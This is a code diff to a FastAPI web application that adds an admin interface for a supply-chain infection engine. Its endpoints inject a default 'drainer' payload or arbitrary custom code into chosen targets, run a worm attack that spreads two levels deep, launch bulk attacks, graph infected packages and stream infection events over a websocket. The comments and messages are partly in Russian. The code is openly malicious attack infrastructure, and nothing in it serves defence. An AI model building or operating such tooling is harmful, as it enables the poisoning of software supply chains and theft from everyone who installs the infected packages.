@@ -30,6 +30,7 @@ import tempfile
 import random
 import math
 from collections import Counter
+import glob
 
 from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response, WebSocket, WebSocketDisconnect, Body
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
@@ -2024,3 +2025,91 @@ async def supply_chain_view_report(request: Request, path: str):
     with open(path, 'r') as f:
         data = json.load(f)
     return HTMLResponse(f"<pre>{json.dumps(data, indent=2, ensure_ascii=False)}</pre>")
+
+@app.post("/supply_chain_admin/attack", response_class=JSONResponse)
+async def supply_chain_attack(request: Request, target_json: str = Form(...), payload: str = Form("drainer"), custom_payload_code: str = Form(None)):
+    import json
+    from agent_modules.supply_chain_infection import SupplyChainInfectionEngine
+    try:
+        target = json.loads(target_json)
+    except Exception as e:
+        return JSONResponse({"status": "error", "message": f"Ошибка парсинга цели: {e}"}, status_code=400)
+    engine = SupplyChainInfectionEngine()
+    result = engine.inject_payload(target, payload_type=payload, custom_payload_code=custom_payload_code)
+    logger.info(f"[SupplyChain] Manual attack launched: {target.get('type')} {target.get('name')} payload={payload}")
+    return {"status": result.get("status", "error"), "message": result.get("details", "Результат неизвестен")}
+
+@app.post("/supply_chain_admin/worm_attack")
+async def supply_chain_worm_attack():
+    from agent_modules.supply_chain_infection import SupplyChainInfectionEngine
+    engine = SupplyChainInfectionEngine()
+    result = engine.run(worm_mode=True, worm_depth=2)
+    logger.info("[SupplyChain] Worm-атака запущена через UI")
+    return {"status": result.get("status", "error"), "message": "Worm-атака завершена. Заражено: %d целей." % len(result.get("infection_results", []))}
+
+@app.post("/supply_chain_admin/bulk_attack")
+async def supply_chain_bulk_attack(request: Request):
+    import json
+    from agent_modules.supply_chain_infection import SupplyChainInfectionEngine
+    form = await request.form()
+    payload = form.get("payload", "drainer")
+    custom_payload_code = form.get("custom_payload_code")
+    targets = form.getlist("targets")
+    engine = SupplyChainInfectionEngine()
+    results = []
+    for t_json in targets:
+        try:
+            t = json.loads(t_json)
+            res = engine.inject_payload(t, payload_type=payload, custom_payload_code=custom_payload_code)
+            results.append(res)
+        except Exception as e:
+            results.append({"target": t_json, "status": "error", "details": str(e)})
+    logger.info(f"[SupplyChain] Bulk-атака по {len(targets)} целям, payload={payload}")
+    return {"status": "success", "message": f"Bulk-атака завершена. Заражено: {len(results)} целей."}
+
+@app.get("/api/supply_chain/infection_graph")
+async def api_supply_chain_infection_graph():
+    import glob, json
+    nodes = {}
+    links = []
+    for path in glob.glob("extracted_data/supply_chain/supply_chain_report_*.json"):
+        try:
+            with open(path) as f:
+                data = json.load(f)
+            for res in data.get("infection_results", []):
+                tid = f"{res['target'].get('type')}:{res['target'].get('name')}"
+                nodes[tid] = {"id": tid, "name": res['target'].get('name'), "type": res['target'].get('type')}
+                parent = res.get('parent')
+                if parent:
+                    links.append({"source": parent, "target": tid})
+        except Exception:
+            continue
+    return {"nodes": list(nodes.values()), "links": links}
+
+supply_chain_ws_clients = set()
+
+@app.websocket("/ws/supply_chain_admin")
+async def ws_supply_chain_admin(websocket: WebSocket):
+    await websocket.accept()
+    supply_chain_ws_clients.add(websocket)
+    try:
+        while True:
+            await websocket.receive_text()  # ping/pong
+    except WebSocketDisconnect:
+        supply_chain_ws_clients.remove(websocket)
+    except Exception:
+        supply_chain_ws_clients.remove(websocket)
+
+import asyncio
+async def broadcast_supply_chain_event(event: dict):
+    to_remove = set()
+    for ws in supply_chain_ws_clients:
+        try:
+            await ws.send_json(event)
+        except Exception:
+            to_remove.add(ws)
+    for ws in to_remove:
+        supply_chain_ws_clients.remove(ws)
+
+# В местах заражения (bulk, worm, одиночные) вызывать:
+# asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": result}))
